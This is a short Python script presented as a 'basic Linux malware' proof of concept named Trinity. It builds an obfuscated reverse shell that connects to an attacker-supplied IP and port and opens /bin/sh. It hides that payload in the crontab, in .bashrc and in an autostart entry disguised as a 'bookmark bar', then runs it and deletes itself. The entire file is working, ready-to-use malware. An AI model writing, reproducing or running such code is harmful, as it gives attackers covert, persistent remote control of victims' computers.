#!/usr/bin/python
# Trinity - Basic Python Linux Malware PoC
# Made by Optixal

import sys, os

status = "\033[1m\033[94m[*]\033[0m"
good = "\033[1m\033[92m[+]\033[0m"
error = "\033[1m\033[91m[-]\033[0m"

if len(sys.argv) < 4:
    print error, "Usage: python trinity.py [user] [ip] [port]"
    sys.exit(0)

user_home = "/root"
if sys.argv[1] != "root":
    user_home = "/home/" + sys.argv[1]

raw_payload = "import socket,subprocess,os;s=socket.socket();s.connect((\"" + sys.argv[2] + "\"," + sys.argv[3] + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\"/bin/sh\");"
encoded_payload = raw_payload.encode("rot_13").encode("base64").encode("hex")

payload = "python -c 'exec(\"" + encoded_payload + "\".decode(\"hex\").decode(\"base64\").decode(\"rot_13\"))' 2> /dev/null &"
payload_desktop = payload.replace('\"', '\\\"')

def infect_crontab():
    crontab = open('.cron', 'w')
    crontab.write("* * * * * " + payload + "\n")
    crontab.close()
    os.system("crontab < .cron")
    os.remove('.cron')
    print good, "Successfully infected crontab"

def infect_bashrc():
    bashrc = open(user_home + '/.bashrc', 'a')
    bashrc.write(payload + "\n")
    bashrc.close()
    print good, "Successfully infected bashrc"

def infect_autostart():
    os.system("mkdir -p " + user_home + "/.config/autostart")
    desktop_entry = "[Desktop Entry]\n"
    desktop_entry += "Type=Application\n"
    desktop_entry += "Name=bookmarks\n"
    desktop_entry += "Comment=bookmark bar\n"
    desktop_entry += "Exec=sh -c \"" + payload_desktop + "\"\n"
    entry_file = open(user_home + "/.config/autostart/bookmark.desktop", 'w')
    entry_file.write(desktop_entry)
    entry_file.close()
    os.system("chmod 754 " + user_home + "/.config/autostart/bookmark.desktop")
    print good, "Successfully infected autostart"

def launch_final_payload():
    os.system(payload)
    print good, "Successfully launched final payload"

def main():
    print status, "Now, let's begin..."
    infect_crontab()
    infect_bashrc()
    infect_autostart()
    launch_final_payload()

    print status, "Self destructing..."
    os.remove(sys.argv[0])

if __name__ == "__main__":
    main()
